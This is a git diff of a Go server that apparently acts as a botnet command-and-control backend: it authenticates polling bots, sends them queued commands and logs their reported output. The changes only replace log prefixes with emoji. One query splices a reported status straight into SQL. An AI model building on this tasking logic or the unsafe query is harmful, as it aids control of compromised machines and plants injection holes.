@@ -171,7 +171,7 @@ func check_package_legality(guid string, token string, x_sign string, x_time str
 	current_time := utils.GenerateUtcTimestamp()
 	sent_time, _ := strconv.ParseInt(x_time, 10, 64)
 	if current_time-sent_time >= 60*1000 {
-		log.Printf("package overtime")
+		log.Printf("[💀] package overtime")
 		return false
 	}
 	// Check sign
@@ -283,7 +283,7 @@ ReadyPoll:
 					reply.Cmd = "poll"
 					reply.Error = "Can't update task status"
 					reply.TaskId = int64(saved_id)
-					fmt.Println("[-] Failed to update status when execute task id = " + strconv.FormatInt(int64(saved_id), 10))
+					fmt.Println("[💀] Failed to update status when execute task id = " + strconv.FormatInt(int64(saved_id), 10))
 				} else {
 					// Find the command of task and send to bot
 					reply.Cmd = saved_command
@@ -321,15 +321,15 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 	sqlStr := "select id, token, ip from clients where guid=?"
 	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_token, &saved_ip)
 	if err == sql.ErrNoRows {
-		fmt.Println("[-] Can't find bot in report hander")
+		fmt.Println("[💀] Can't find bot in report hander")
 		return
 	} else if err != nil {
-		fmt.Println("[-] Unknown error")
+		fmt.Println("[💀] Unknown error")
 		return
 	}
 	// Check legality of the package
 	if !check_package_legality(guid, saved_token, sign, time1) {
-		fmt.Println("[-] Illegal package")
+		fmt.Println("[💀] Illegal package")
 		return
 	}
 
@@ -337,7 +337,7 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 	var report common.Report
 	err = json.NewDecoder(r.Body).Decode(&report)
 	if err != nil {
-		fmt.Println("[-] Failed to read the report")
+		fmt.Println("[💀] Failed to read the report")
 		return
 	}
 	defer r.Body.Close()
@@ -350,7 +350,7 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 	sqlStr = "update tasks set status='" + status + "',completed_at='" + utils.TimestampStringToMySqlDateTime(time1) + "' where id=?"
 	_, err = db1.Exec(common.Db, sqlStr, report.TaskID)
 	if err != nil {
-		log.Printf("[-] Failed to update task[%s] status\n", report.TaskID)
+		log.Printf("[💀] Failed to update task[%s] status\n", report.TaskID)
 		return
 	}
 
@@ -360,10 +360,10 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 	saved_task_id_int, _ := strconv.ParseInt(report.TaskID, 10, 64)
 	_, err = db1.Insert(common.Db, sqlStr, common.Account, action, saved_id, report.Output, report.Error, saved_ip, saved_task_id_int)
 	if err != nil {
-		log.Printf("[-] Failed to add task[%s] log\n", report.TaskID)
+		log.Printf("[💀] Failed to add task[%s] log\n", report.TaskID)
 		return
 	}
-	fmt.Print("[+] New task log generated\n$ ")
+	fmt.Print("[✅] New task log generated\n$ ")
 }
 
 func Server() {
@@ -379,7 +379,7 @@ func Server() {
 	router.Post("/report", report_handler)
 
 	strPort := strconv.Itoa(common.Cfg.Server.Port)
-	log.Println("[+] Server running on " + common.Cfg.Server.Host + ":" + strPort)
+	log.Println("[✅] Server running on " + common.Cfg.Server.Host + ":" + strPort)
 
 	http.ListenAndServe(":"+strPort, router)
 }
